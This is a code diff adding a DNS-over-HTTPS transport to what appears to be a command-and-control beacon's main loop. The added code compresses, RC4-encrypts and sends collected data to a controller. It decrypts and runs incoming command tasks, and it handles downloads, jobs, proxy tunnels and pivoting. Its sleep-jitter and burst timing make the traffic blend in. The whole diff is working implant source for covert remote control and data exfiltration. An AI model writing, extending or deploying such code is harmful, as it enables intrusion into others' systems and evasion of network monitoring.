@@ -420,6 +420,135 @@ void AgentMain()
 	AgentClear(g_Agent->config->exit_method);
 }
 
+#elif defined(BEACON_DOH)
+
+#include "ConnectorDoH.h"
+#include "DnsCompression.h"
+ConnectorDoH* g_Connector;
+
+void AgentMain()
+{
+	if (!ApiLoad())
+		return;
+
+	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
+	*g_Agent = Agent();
+
+	g_Connector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
+	*g_Connector = ConnectorDoH();
+		
+	ULONG beatSize = 0;
+	BYTE* beat = g_Agent->BuildBeat(&beatSize);
+		
+	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize))
+		return;
+
+	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
+	*packerOut = Packer();
+	packerOut->Pack32(0);
+
+	do {
+		if (packerOut->datasize() > 4) {
+			packerOut->Set32(0, packerOut->datasize());
+		
+			BYTE* plainBuf = packerOut->data();
+			ULONG plainLen = packerOut->datasize();
+		
+			BYTE* sessionBuf = NULL;
+			ULONG sessionLen = 0;
+		
+			BYTE* payload    = plainBuf;
+			ULONG payloadLen = plainLen;
+			BYTE  flags      = 0;
+		
+			const ULONG minCompressSize = 2048;
+			if (payloadLen > minCompressSize) {
+				BYTE* compBuf = NULL;
+				ULONG compLen = 0;
+				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
+					payload    = compBuf;
+					payloadLen = compLen;
+					flags      = 1;
+				}
+			}
+		
+			sessionLen = 1 + 4 + payloadLen;
+			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
+			if (sessionBuf) {
+				sessionBuf[0] = flags;
+				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
+				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
+				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
+				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
+				memcpy(sessionBuf + 5, payload, payloadLen);
+			}
+		
+			if (!sessionBuf) {
+				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
+				g_Connector->SendData(plainBuf, plainLen);
+			} else {
+				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
+				g_Connector->SendData(sessionBuf, sessionLen);
+				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
+			}
+		
+			if (flags & 0x1 && payload && payload != plainBuf) {
+				MemFreeLocal((LPVOID*)&payload, payloadLen);
+			}
+		
+			packerOut->Clear(TRUE);
+			packerOut->Pack32(0);
+		} else {
+			g_Connector->SendData(NULL, 0);
+		}
+
+		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
+			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
+			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
+		}
+		g_Connector->RecvClear();
+
+		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
+			ULONG baseSleep = g_Agent->config->sleep_delay;
+			ULONG jitter    = g_Agent->config->jitter_delay;
+
+			BOOL burst = FALSE;
+			if (g_Connector->IsBusy() || (g_Connector->GetLastUpTotal() >= (1 * 1024)) || (g_Connector->GetLastDownTotal() >= (1 * 1024))) {
+				burst = TRUE;
+			}
+
+			if (burst) {
+				ULONG burstSleep = 50;
+				if (baseSleep < burstSleep)
+					burstSleep = baseSleep;
+				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0);
+				g_Connector->ResetTrafficTotals();
+			} else {
+				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
+			}
+		}
+
+		g_Agent->downloader->ProcessDownloader(packerOut);
+		g_Agent->jober->ProcessJobs(packerOut);
+		g_Agent->proxyfire->ProcessTunnels(packerOut);
+		g_Agent->pivotter->ProcessPivots(packerOut);
+
+	} while (g_Agent->IsActive());
+
+	g_Agent->commander->Exit(packerOut);
+
+	packerOut->Set32(0, packerOut->datasize());
+
+	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
+
+	g_Connector->SendData(packerOut->data(), packerOut->datasize());
+	packerOut->Clear(TRUE);
+	g_Connector->RecvClear();
+
+	g_Connector->CloseConnector();
+	AgentClear(g_Agent->config->exit_method);
+}
+
 #endif
 
 void AgentClear(int method)
